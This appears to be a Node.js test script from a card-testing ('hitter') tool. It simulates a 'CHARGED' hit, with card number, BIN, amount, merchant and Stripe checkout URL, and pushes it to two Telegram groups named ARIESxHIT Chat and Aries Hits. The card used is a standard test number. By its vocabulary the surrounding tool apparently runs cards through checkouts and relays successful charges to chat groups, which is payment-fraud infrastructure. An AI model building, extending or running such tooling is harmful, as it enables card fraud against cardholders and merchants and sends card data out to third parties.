// Test hit notifications to both groups using actual system
const { sendHitToGroups } = require('./services/telegramService');

console.log('🧪 Testing Hit Notifications to Both Groups...\n');

// Simulate a successful hit data (like what comes from checkout processing)
const hitData = {
  userId: '6447766151',
  userName: 'Test User',
  card: '4111111111111111',
  bin: '411111',
  binMode: false,
  amount: '9.99',
  attempts: 1,
  timeTaken: '2.3s',
  merchant: 'https://testmerchant.com', // This should be the business_url for personal bot
  businessUrl: 'https://testmerchant.com',
  currentUrl: 'https://checkout.stripe.com/...',
  email: 'test@example.com',
  status: 'CHARGED',
  timestamp: new Date().toISOString()
};

const checkoutUrl = 'https://checkout.stripe.com/c/pay/cs_test_example';

console.log('📤 Sending hit notification to groups...');
console.log('User:', `${hitData.userName} (${hitData.userId})`);
console.log('Card:', hitData.card);
console.log('Amount:', `$${hitData.amount} USD`);
console.log('Merchant (Business URL):', hitData.merchant);
console.log('Status:', hitData.status);
console.log('Checkout URL:', checkoutUrl);
console.log('');

console.log('🎯 Group 1 (ARIESxHIT Chat - Simple Format):');
console.log('   Should receive: Basic hit info with card, amount, merchant');
console.log('');

console.log('🎯 Group 2 (Aries Hits - Detailed Format):');
console.log('   Should receive: Full detailed hit info with all data');
console.log('');

async function testHitNotification() {
  try {
    console.log('🚀 Calling sendHitToGroups...');
    await sendHitToGroups(hitData, checkoutUrl);
    console.log('✅ sendHitToGroups completed successfully!');

    console.log('\n📊 Expected Results:');
    console.log('1. ARIESxHIT Chat should receive simple format notification');
    console.log('2. Aries Hits should receive detailed format notification');
    console.log('3. Both should show correct merchant name (business_url)');
    console.log('4. Both should have clickable user links');
    console.log('5. Card data should be properly formatted');

    console.log('\n✅ Hit notification test completed! Check your Telegram groups.');

  } catch (error) {
    console.error('❌ Test failed:', error.message);
    console.error('Stack:', error.stack);
  }
}

testHitNotification();